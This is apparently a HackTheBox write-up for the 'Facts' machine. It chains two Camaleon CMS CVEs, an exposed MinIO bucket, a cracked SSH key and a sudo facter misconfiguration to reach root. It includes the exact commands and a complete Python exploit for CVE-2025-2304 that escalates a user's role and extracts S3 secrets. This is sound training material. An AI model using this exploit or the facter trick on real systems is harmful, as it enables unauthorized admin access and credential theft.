# Facts — HackTheBox

| | |
|---|---|
| **Difficulty** | Medium |
| **OS** | Linux (Ubuntu 25.04) |
| **Date** | May 2026 |
| **Status** | Retired |
| **Tags** | CMS, CVE, Mass Assignment, Path Traversal, S3/MinIO, Privilege Escalation |

## Overview

Facts is a Medium-difficulty Linux machine running Camaleon CMS (Ruby on Rails). The path to root chains two CVEs in the CMS — an authenticated path traversal and a mass assignment privilege escalation — into exposed S3 credentials, an SSH key stored in a misconfigured MinIO bucket, and a sudo misconfiguration in the `facter` system profiling tool.

## Recon

```bash
nmap --privileged -sCV -A -Pn -oN nmap-scan.txt 10.129.244.96
```

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.9p1 (Ubuntu) |
| 80 | HTTP | nginx 1.26.3 |

- Port 80 redirects to `facts.htb` → added to `/etc/hosts`
- Session cookie `_factsapp_session` is a strong fingerprint for a Rails app
- Site is a trivia/facts CMS blog with an `/admin` panel

## Enumeration

```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt --exclude-length 11110-11140 -o gobuster-enum.txt
gobuster dir -u http://facts.htb/admin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt --exclude-length 0 -b 302
```

Found: `/admin/login`, `/admin/register`, `/admin/forgot`

CMS fingerprinting confirmed **Camaleon CMS v2.9.0** (visible in the admin dashboard footer). Two relevant CVEs were identified for this version:

- **CVE-2024-46987** — authenticated path traversal (arbitrary file read)
- **CVE-2025-2304** — mass assignment / privilege escalation

Registering a low-privilege account (`test:test`) confirmed the `client` role only sees a limited dashboard.

### Credentials / Secrets Found

| Credential | Source | Used For |
|---|---|---|
| `test:test` | Self-registered | Camaleon admin panel |
| AWS-style S3 keys (redacted) | Camaleon `/admin/settings/site` (via CVE-2025-2304) | MinIO endpoint `:54321` |
| SSH key, passphrase `dragonballz` | MinIO bucket `internal/.ssh/id_ed25519` | SSH as `trivia` |

## Exploitation

```bash
# Step 1 — Path Traversal (CVE-2024-46987, EDB-ID: 52531)
python3 52531.py
# Target: http://facts.htb, File: /etc/passwd
# -> Revealed users: trivia (uid 1000), william (uid 1001)

# Step 2 — Mass Assignment (CVE-2025-2304)
# Registered as test:test, intercepted password-change request,
# injected password[role]=admin into /admin/users/<id>/updated_ajax
python3 exploit.py -u http://facts.htb -U test -P test -e -r
# -> Role escalated to admin, S3 credentials extracted from /admin/settings/site

# Step 3 — Access the MinIO S3 bucket
aws --endpoint-url http://10.129.244.96:54321 s3 ls
# -> internal, randomfacts

aws --endpoint-url http://10.129.244.96:54321 s3 cp s3://internal/.ssh/id_ed25519 ./facts_id
chmod 600 facts_id

# Step 4 — Crack the SSH key passphrase
ssh2john facts_id > facts.id
john facts.id --wordlist=/usr/share/wordlists/rockyou.txt
# -> dragonballz (cracked in ~1m39s)

# Step 5 — SSH in as trivia
ssh trivia@facts.htb -i facts_id
```

**Why it worked:**
- The path traversal allowed arbitrary server-side file reads via auth-token injection in the download endpoint.
- Mass assignment in `updated_ajax` used Rails' `permit!` (no parameter filtering), so injecting `role=admin` worked directly.
- MinIO was bound to `0.0.0.0:54321` — externally reachable with no network isolation.
- A private SSH key was stored in a world-accessible S3 bucket.

## Post-Exploitation

The path traversal CVE alone is enough for direct data exfiltration — no SSH or credentials required:

```bash
python3 52531.py
# Target: http://facts.htb, File: /home/william/user.txt
# -> user flag retrieved directly through the CVE
```

This shows the CVE on its own is enough for an attacker to exfiltrate sensitive files before ever getting shell access.

## Privilege Escalation

```bash
sudo -l
# -> (ALL) NOPASSWD: /usr/bin/facter

echo 'exec"/bin/bash"' > ~/exploit.rb
sudo /usr/bin/facter --custom-dir /home/trivia exploit
# -> root shell
```

**Root cause:** `facter --custom-dir <path>` loads and **executes** any `.rb` file in the given directory as root. Since `trivia` controls their own home directory, this is a one-line Ruby RCE to root — not a GTFOBin, but a logic flaw in how the sudo rule was scoped.

## Failed Attempts

| Attempt | Why it failed | Lesson |
|---|---|---|
| SQLmap on `/search` and `/admin/search` | No injectable parameters | Confirm the stack before assuming SQLi |
| WPScan on facts.htb | Not WordPress | Fingerprint the CMS before reaching for specific scanners |
| PATH hijack via `/opt/.../gem/bin/ruby` | `facter` uses a hardcoded `#!/usr/bin/ruby` shebang | PATH hijacks only work when a binary is invoked by name |
| Path traversal on `/home/trivia/.ssh/id_rsa` | 500 error — file not world-readable | Traversal is limited by the app process's read permissions |

## Vulnerability Summary

| Vulnerability | CVE | Severity | CVSS |
|---|---|---|---|
| Path Traversal — Arbitrary File Read | CVE-2024-46987 | High | 7.5 |
| Mass Assignment — Role Escalation | CVE-2025-2304 | Critical | 9.4 |
| SSH Key Exposed in S3 Bucket | — | Critical | 9.1 |
| Weak SSH Key Passphrase | — | High | 7.5 |
| `sudo facter --custom-dir` RCE | — | Critical | 8.8 |

## Attack Chain

```
Register account -> CVE-2024-46987 (read /etc/passwd) -> users: trivia, william
   -> CVE-2025-2304 (mass assignment) -> role: admin -> S3 creds leaked
   -> MinIO: download id_ed25519 -> crack passphrase (dragonballz)
   -> SSH as trivia -> sudo facter --custom-dir -> ROOT
```

## Lessons Learned

- A distinctive session cookie name is often an instant framework/CMS fingerprint.
- Once a CMS version is identified, check both ExploitDB and NVD — there can be multiple relevant CVEs.
- Rails mass assignment vulnerabilities usually trace back to `permit!` instead of explicit allowlisting.
- Always read the `--help` output of sudo-able binaries; the exploitable flag is often documented.

## Exploit — CVE-2025-2304 Mass Assignment

```python
# Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
# CVE-2025-2304 — Mass Assignment via permit! in updated_ajax

import argparse
import requests
import re
import sys

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="URL")
parser.add_argument("-U", "--username", required=True, help="Username")
parser.add_argument("-P", "--password", required=True, help="Password")
parser.add_argument("--newpass", default="test", help="New password to set")
parser.add_argument("-e", "--extract", action="store_true", help="Extract AWS Secrets")
parser.add_argument("-r", "--revert", action="store_true", help="Revert role back to client after escalation")

args = parser.parse_args()

print("[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)")

s = requests.Session()

r = s.get(f"{args.url}/admin/login")
m = re.search(r'<input type="hidden" name="authenticity_token" value="([^"]*)"', r.text)
csrf = m.group(1)

data = {
    "authenticity_token": csrf,
    "user[username]": args.username,
    "user[password]": args.password
}

r = s.post(f"{args.url}/admin/login", data=data)
if "/admin/logout" in r.text:
    print("[+] Login confirmed")
else:
    print("[-] Login failed")
    exit()

r = s.get(f"{args.url}/admin/profile/edit")
m = re.search(r'<meta name="csrf-token" content="([^"]*)"[^>]*', r.text)
csrf = m.group(1)
m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_id"[^>]*', r.text)
user_id = m.group(1)
m = re.search(r'<option selected="selected" value="([^"]*)">', r.text)
user_role = m.group(1)
print(f"   User ID: {user_id} | Current Role: {user_role}")

data = {
    "_method": "patch",
    "authenticity_token": csrf,
    "password[password]": args.newpass,
    "password[password_confirmation]": args.newpass,
    "password[role]": "admin"
}
headers = {"X-CSRF-Token": csrf, "X-Requested-With": "XMLHttpRequest"}
s.post(f"{args.url}/admin/users/{user_id}/updated_ajax", data=data, headers=headers)

r = s.get(f"{args.url}/admin/profile/edit")
m = re.search(r'<option selected="selected" value="([^"]*)">', r.text)
print(f"[+] Updated Role: {m.group(1)}")

if args.extract:
    print("[+] Extracting S3 Credentials")
    r = s.get(f"{args.url}/admin/settings/site")
    for field, label in [
        ("options_filesystem_s3_access_key", "s3 access key"),
        ("options_filesystem_s3_secret_key", "s3 secret key"),
        ("options_filesystem_s3_endpoint", "s3 endpoint"),
    ]:
        m = re.search(rf'<input[^>]*value="([^"]*)"[^>]*{field}[^>]*', r.text)
        print(f"   {label}: {m.group(1)}")

if args.revert:
    r = s.get(f"{args.url}/admin/profile/edit")
    m = re.search(r'<meta name="csrf-token" content="([^"]*)"[^>]*', r.text)
    csrf = m.group(1)
    data = {"_method": "patch", "authenticity_token": csrf,
            "password[password]": args.newpass, "password[password_confirmation]": args.newpass,
            "password[role]": user_role}
    headers = {"X-CSRF-Token": csrf, "X-Requested-With": "XMLHttpRequest"}
    s.post(f"{args.url}/admin/users/{user_id}/updated_ajax", data=data, headers=headers)
    print("[+] Role reverted")
```

**Usage:**

```bash
python3 exploit.py -u http://facts.htb -U test -P test -e -r
```

---

Author: Hamza Al-Najjar (Z3R0)
